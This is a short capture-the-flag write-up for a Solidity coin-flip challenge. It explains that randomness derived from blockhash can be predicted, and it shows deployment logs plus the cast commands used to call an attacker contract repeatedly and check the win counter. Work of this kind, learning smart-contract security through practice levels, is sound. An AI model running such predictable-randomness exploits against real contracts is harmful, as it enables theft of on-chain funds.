
## Challenge 03 
Exploit: The contract uses `blockhash` to generate a pseudo-random coin flip value, which we can easily replicate.

contract: [src/03_CoinFlip.sol](src/03_CoinFlip.sol)
exploit: [script/03_CoinFlipSolve.s.sol](script/03_CoinFlipSolve.s.sol)

- I deployed the contract.
```
== Logs ==
  Attacker contract at address  0x7851c673fA4c110EBc0192939c2c7B27c59A01D2
  Block  10789310 , ConsecutiveWins =  2
  Block  10789310 , ConsecutiveWins =  3

```

- after that i just called the attack() function multiple times consecutively so that it executes on different tx block everytime.

```bash
cast send 0x7851c673fA4c110EBc0192939c2c7B27c59A01D2 "attack(address)" $INSTANCE_ADDRESS \
  --rpc-url $RPC_URL \
  --private-key $PRIVATE_KEY
```

- Yep, the win increase to 4 from 3.
```
❯ cast call 0x77Cc3aCCa0b9fFF99Ed194134dFACC11DB7E4306 "consecutiveWins()" --rpc-url $RPC_URL
0x0000000000000000000000000000000000000000000000000000000000000004
```
- repeat another 6 times and we are done!

